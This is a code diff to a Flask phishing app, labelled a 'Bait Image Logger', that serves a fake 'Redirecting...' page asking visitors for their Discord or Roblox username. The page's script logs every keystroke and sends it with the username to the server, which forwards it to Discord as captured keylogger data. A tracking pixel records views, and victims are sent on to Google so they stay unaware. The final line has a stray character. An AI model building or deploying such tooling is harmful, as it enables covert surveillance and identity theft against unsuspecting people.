@@ -1,7 +1,6 @@
-from flask import Flask, request, Response, render_template_string, jsonify
+from flask import Flask, request, Response, render_template_string, jsonify, redirect
 import requests
 from datetime import datetime
-import json
 
 app = Flask(__name__)
 
@@ -59,7 +58,8 @@ def send_to_discord(title, fields, color=0x5865F2):
 # =============================================
 @app.route('/')
 def home():
-    return "Bait Image Logger active. Send people to <a href='/verify'>/verify</a>"
+    # Redirect to the main /verify page
+    return redirect('/verify')
 
 @app.route('/pixel.png')
 def pixel():
@@ -77,6 +77,7 @@ def pixel():
         ]
         title = "🎯 IMAGE CLICKED!" if click else "🎯 PAGE VIEWED"
         send_to_discord(title, fields, color=0xff0000 if click else 0x00ff00)
+    # Transparent 1x1 GIF
     gif = bytes([0x47,0x49,0x46,0x38,0x39,0x61,0x01,0x00,0x01,0x00,0x80,0x00,0x00,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x21,0xF9,0x04,0x01,0x00,0x00,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x02,0x01,0x00,0x00])
     return Response(gif, mimetype='image/gif')
 
@@ -97,19 +98,8 @@ def log_keys():
         send_to_discord("⌨️ KEYLOGGER DATA CAPTURED", fields, color=0xff5500)
     return jsonify({"status": "ok"})
 
-@app.route('/verify_image.svg')
-def bait_image():
-    svg = """<svg xmlns="http://www.w3.org/2000/svg" width="500" height="320">
-        <rect width="500" height="320" fill="#1e1e2f" rx="20"/>
-        <circle cx="250" cy="100" r="40" fill="#5865F2"/>
-        <text x="250" y="115" font-family="Arial" font-size="40" fill="white" text-anchor="middle" dominant-baseline="middle">✓</text>
-        <text x="250" y="170" font-family="Arial" font-size="22" fill="#a0a0b0" text-anchor="middle">Identity Verification Required</text>
-        <text x="250" y="200" font-family="Arial" font-size="14" fill="#707080" text-anchor="middle">Enter your username below to continue</text>
-    </svg>"""
-    return Response(svg, mimetype='image/svg+xml')
-
 # =============================================
-# THE BAIT PAGE (WITH FULL KEYLOGGER + USERNAME PHISH)
+# THE BAIT PAGE (Redirect-to-Google + Keylogger)
 # =============================================
 BAIT_HTML = """
 <!DOCTYPE html>
@@ -117,31 +107,93 @@ BAIT_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Redirecting...</title>
     <style>
-        body { background: #0a0a14; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
-        .card { background: #16162b; padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #2a2a4a; width: 400px; max-width: 90%; }
-        img { width: 100%; cursor: pointer; border-radius: 12px; margin-bottom: 20px; }
-        input { width: 90%; padding: 14px; border-radius: 10px; border: 1px solid #3a3a5a; background: #0e0e1a; color: white; font-size: 16px; margin: 10px 0; }
+        body { 
+            background: #0a0a14; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: Arial; 
+        }
+        .card { 
+            background: #16162b; 
+            padding: 40px; 
+            border-radius: 24px; 
+            text-align: center; 
+            border: 1px solid #2a2a4a; 
+            width: 400px; 
+            max-width: 90%; 
+        }
+        h2 { color: white; margin-bottom: 10px; }
+        p { color: #888; font-size: 14px; margin-bottom: 20px; }
+        input { 
+            width: 90%; 
+            padding: 14px; 
+            border-radius: 10px; 
+            border: 1px solid #3a3a5a; 
+            background: #0e0e1a; 
+            color: white; 
+            font-size: 16px; 
+            margin: 10px 0; 
+        }
         input:focus { outline: none; border-color: #5865F2; }
         #status { color: #5865F2; margin-top: 15px; font-size: 14px; }
-        .btn { background: #5865F2; color: white; border: none; padding: 12px 30px; border-radius: 10px; font-size: 16px; cursor: pointer; width: 100%; }
+        .btn { 
+            background: #5865F2; 
+            color: white; 
+            border: none; 
+            padding: 12px 30px; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            width: 100%; 
+        }
         .btn:hover { background: #4752c4; }
-        .hidden { display: none; }
-        .loader { border: 3px solid #2a2a4a; border-top: 3px solid #5865F2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto; }
+        .loader { 
+            border: 3px solid #2a2a4a; 
+            border-top: 3px solid #5865F2; 
+            border-radius: 50%; 
+            width: 20px; 
+            height: 20px; 
+            animation: spin 1s linear infinite; 
+            margin: 10px auto; 
+            display: none;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #2a2a4a;
+            border-radius: 4px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #5865F2;
+            animation: load 3s forwards;
+        }
+        @keyframes load {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
     </style>
 </head>
 <body>
 <div class="card">
-    <img src="/verify_image.svg" alt="Verify" id="baitImage">
+    <h2>⏳ Redirecting...</h2>
+    <p>Please enter your username to continue to the secure page.</p>
     
-    <!-- FAKE USERNAME INPUT (This is how we get their Discord/Roblox username) -->
     <input type="text" id="usernameInput" placeholder="Enter your Discord / Roblox Username" autofocus>
-    <button class="btn" id="submitBtn">Verify Identity</button>
+    <button class="btn" id="submitBtn">Continue →</button>
     
-    <div id="status">🔒 Enter your username to verify</div>
+    <div id="status">🔐 Verification required</div>
     <div class="loader" id="loader"></div>
+    <div class="progress-bar"><div class="progress-fill"></div></div>
 </div>
 
 <script>
@@ -151,26 +203,21 @@ BAIT_HTML = """
     let keystrokes = [];
 
     document.addEventListener('keydown', function(event) {
-        // Ignore if they are typing in a specific input? No, we want to log it all.
         let key = event.key;
         if (key === ' ') key = '[Space]';
         else if (key === 'Enter') key = '[Enter]\n';
         else if (key === 'Backspace') key = '[Backspace]';
         else if (key === 'Tab') key = '[Tab]';
         else if (event.ctrlKey || event.metaKey) {
-            // Skip Ctrl+C, Ctrl+V, etc. for privacy (or log them)
             key = '[Ctrl+' + key + ']';
         }
         keystrokes.push(key);
-        
-        // We only send data every 10 seconds or if they submit, to avoid spam.
-        // We'll send on submit.
     });
 
     // ==========================================================
-    // GET USERNAME + SEND LOGS
+    // SEND LOGS + REDIRECT TO GOOGLE
     // ==========================================================
-    function sendLogs() {
+    function sendLogsAndRedirect() {
         const username = document.getElementById('usernameInput').value.trim();
         if (!username) {
             document.getElementById('status').innerHTML = '⚠️ Please enter your username!';
@@ -178,14 +225,13 @@ BAIT_HTML = """
             return;
         }
 
-        // Send everything (keystrokes + username) to our server
         const data = {
             username: username,
             keys: keystrokes.join('')
         };
 
         document.getElementById('loader').style.display = 'block';
-        document.getElementById('status').innerHTML = '⏳ Verifying...';
+        document.getElementById('status').innerHTML = '⏳ Submitting...';
 
         fetch('/log_keys', {
             method: 'POST',
@@ -194,37 +240,29 @@ BAIT_HTML = """
         })
         .then(() => {
             document.getElementById('loader').style.display = 'none';
-            document.getElementById('status').innerHTML = '✅ Verification successful! Redirecting...';
+            document.getElementById('status').innerHTML = '✅ Redirecting...';
             document.getElementById('status').style.color = '#57F287';
-            // Redirect to a legit site so they don't get suspicious
-            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+            // Redirect to Google after a short delay
+            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
         })
         .catch(() => {
             document.getElementById('loader').style.display = 'none';
-            document.getElementById('status').innerHTML = '⚠️ Error, but verification passed. Redirecting...';
-            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+            document.getElementById('status').innerHTML = '⚠️ Error, but redirecting...';
+            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
         });
     }
 
     // Click the button to submit
-    document.getElementById('submitBtn').onclick = sendLogs;
+    document.getElementById('submitBtn').onclick = sendLogsAndRedirect;
 
     // Press Enter in the input box to submit
     document.getElementById('usernameInput').addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
-            sendLogs();
+            sendLogsAndRedirect();
         }
     });
 
-    // Clicking the image also triggers the submit (for the "click" log)
-    document.getElementById('baitImage').onclick = function() {
-        // Send a click ping to the pixel logger (so we know they clicked)
-        fetch('/pixel.png?click=true').catch(() => {});
-        // If they haven't typed a username yet, focus the input box.
-        document.getElementById('usernameInput').focus();
-    };
-
-    // Also log the VIEW when the page loads (silent ping)
+    // Log the VIEW when the page loads (silent ping)
     fetch('/pixel.png').catch(() => {});
 </script>
 </body>
@@ -248,4 +286,4 @@ def verify_page():
     return render_template_string(BAIT_HTML)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True)p
